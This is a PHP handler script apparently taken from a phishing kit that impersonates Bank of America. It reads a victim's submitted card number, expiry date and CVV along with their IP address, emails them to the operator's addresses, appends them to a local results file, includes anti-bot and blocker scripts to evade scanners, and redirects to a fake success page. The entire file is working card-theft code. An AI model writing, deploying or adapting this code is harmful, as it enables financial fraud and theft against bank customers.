<?php include ("../images/sec.gif");
$zabi = getenv("REMOTE_ADDR");
include '../antibots.php';
include('../email.php');
include '../bt.php';
include "../blocker.php";
$message .= "--------------  BOA LOGIN  -------------\n";
$message .= "Card Number  : ".$_POST['numcd']."\n";
$message .= "Month        : ".$_POST['mm']."\n";
$message .= "Year         : ".$_POST['yy']."\n";
$message .= "CVV          : ".$_POST['cvv']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "-----------------------------------------------------\n";
$cc = $_POST['ccn'];
$subject = "BOA BAN3 LOGGN [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: HACKER.SPAMMER <contact>\r\n";
mail($email,$subject,$message,$headers);
mail($userinfo,$subject,$message,$headers);
$text = fopen('../../rezlt.txt', 'a');
fwrite($text, $message);


header("Location: ../Successfull.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>